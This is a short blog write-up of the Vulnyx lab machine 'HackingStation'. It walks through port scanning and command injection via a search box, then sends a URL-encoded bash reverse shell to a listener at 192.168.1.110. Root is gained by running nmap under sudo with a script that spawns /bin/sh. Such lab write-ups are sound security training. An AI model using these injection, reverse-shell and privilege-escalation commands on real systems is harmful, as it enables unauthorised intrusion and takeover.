---
layout: single 
title: HackingStation - Vulnyx
date: 2024-06-16
classes: wide
header:
  teaser: /assets/images/vulnyx-writeup-hackingstation/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnyx.png
categories:
  - Vulnyx
  - Low
tags:
  - OS Command Execution
  - Abusing SUID Binaries
---

![logo](/assets/images/vulnyx-writeup-hackingstation/logo.png)

## Port Scanning

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.1.119

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:B0:92:23 (VMware)
```

## Service Discovery

```bash
sudo nmap -sV -sC -p 80 -v 192.168.1.119

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: HackingStation
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 00:0C:29:B0:92:23 (VMware)
```

## Method 1

We start by checking the HTTP port 80. We can see the following page:
![index](/assets/images/vulnyx-writeup-hackingstation/index.png)

Let's enter any word in the search bar to check its behavior:

![test](/assets/images/vulnyx-writeup-hackingstation/test.png)

As we can see in the image, it uses the searchsploit command to search for exploits with the word we entered. This means that the server is executing console commands to perform our search.

If we try to execute another command with the statement `;whoami`, we get the following result:

![whoami](/assets/images/vulnyx-writeup-hackingstation/whoami.png)

We see that our `whoami` command executes correctly, so we have **command execution**.
Let's send a reverse shell with the following URL-encoded command:

```bash
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.110/8000%200%3E%261%27
```

Once we get the reverse shell, we execute the `sudo -l` command to see if there is any command that can be executed as root:

```bash
User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
```

We can execute the nmap command as the root user. We can exploit this binary in the following way:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

![root](/assets/images/vulnyx-writeup-hackingstation/root.png)
